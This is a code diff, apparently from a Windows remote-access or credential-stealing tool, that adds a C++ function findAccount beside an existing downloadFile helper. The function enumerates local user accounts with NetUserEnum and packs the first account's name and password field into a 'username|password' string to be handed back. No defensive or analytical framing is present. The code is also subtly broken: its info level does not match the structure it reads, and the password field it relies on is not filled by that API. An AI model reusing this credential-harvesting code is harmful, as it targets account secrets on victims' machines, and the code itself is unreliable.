@@ -111,3 +111,79 @@ void util::downloadFile(char *data) {
     }
 
 }
+
+
+
+char* util::findAccount() {
+    char *result = 0;
+    LPUSER_INFO_3 pBuf = NULL;
+    LPUSER_INFO_3 pTmpBuf;
+    DWORD dwLevel = 0;
+    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
+    DWORD dwEntriesRead = 0;
+    DWORD dwTotalEntries = 0;
+    DWORD dwResumeHandle = 0;
+    DWORD i;
+    DWORD dwTotalCount = 0;
+    NET_API_STATUS nStatus;
+    LPTSTR pszServerName = NULL;
+    do // begin do
+    {
+        nStatus = NetUserEnum((LPCWSTR) pszServerName,
+                              dwLevel,
+                              3, // global users
+                              (LPBYTE *) &pBuf,
+                              dwPrefMaxLen,
+                              &dwEntriesRead,
+                              &dwTotalEntries,
+                              &dwResumeHandle);
+        //
+        // If the call succeeds,
+        //
+        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
+            if ((pTmpBuf = pBuf) != NULL && pTmpBuf->usri3_name != NULL && pTmpBuf->usri3_password != NULL) {
+                //
+                // Loop through the entries.
+                //
+                for (i = 0; (i < dwEntriesRead); i++) {
+                    assert(pTmpBuf != NULL);
+
+                    if (pTmpBuf == NULL) {
+                        util::out("An access violation has occurred\n");
+                        break;
+                    }
+                    //
+                    //  Print the name of the user account.
+                    //
+                    int a = wcslen(pTmpBuf->usri3_name) + wcslen(pTmpBuf->usri3_password) + 2;
+                    char* username = (char *) malloc(sizeof(char) * (wcslen(pTmpBuf->usri3_name) + 1));
+                    char* password = (char *) malloc(sizeof(char) * (wcslen(pTmpBuf->usri3_password) + 1));
+                    wcstombs(username, pTmpBuf->usri3_name, wcslen(pTmpBuf->usri3_name) + 1);
+                    wcstombs(password, pTmpBuf->usri3_password, wcslen(pTmpBuf->usri3_password) + 1);
+                    result = (char*)malloc(sizeof(char) * a);
+                    memset(result, 0, a);
+                    strcpy(result, username);
+                    strcat(result, "|");
+                    strcat(result, password);
+
+                    pTmpBuf++;
+                    dwTotalCount++;
+                    break;
+                }
+            }
+        }
+            //
+            // Otherwise, print the system error.
+            //
+        else
+            util::out("A system error has occurred: %d\n", nStatus);
+        //
+        // Free the allocated buffer.
+        //
+        if (pBuf != NULL) {
+            NetApiBufferFree(pBuf);
+            pBuf = NULL;
+        }
+    } while (nStatus == ERROR_MORE_DATA); // end do
+    return result;
+}
